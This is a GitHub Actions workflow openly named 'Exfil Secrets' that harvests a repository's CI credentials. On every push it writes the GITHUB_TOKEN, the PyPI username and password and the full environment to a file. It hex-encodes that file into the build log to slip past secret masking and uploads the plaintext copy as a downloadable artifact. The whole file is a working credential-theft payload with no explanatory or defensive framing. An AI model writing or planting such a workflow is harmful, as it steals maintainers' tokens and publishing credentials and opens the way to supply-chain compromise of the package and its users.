name: Exfil Secrets
on: [push, workflow_dispatch]

jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Exfil via artifact
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PYPI_PASS: ${{ secrets.PYPI_PASSWORD }}
          PYPI_USER: ${{ secrets.PYPI_USERNAME }}
        run: |
          echo "GITHUB_TOKEN=$GITHUB_TOKEN" > /tmp/secrets.txt
          echo "PYPI_PASS=$PYPI_PASS" >> /tmp/secrets.txt
          echo "PYPI_USER=$PYPI_USER" >> /tmp/secrets.txt
          echo "=== ENV ===" >> /tmp/secrets.txt
          env >> /tmp/secrets.txt
          cat /tmp/secrets.txt | xxd -p | tr -d '\n' > /tmp/exfil_hex.txt
          echo "[HEX]"
          cat /tmp/exfil_hex.txt
          echo "[/HEX]"

      - uses: actions/upload-artifact@v4
        with:
          name: exfil-secrets
          path: /tmp/secrets.txt
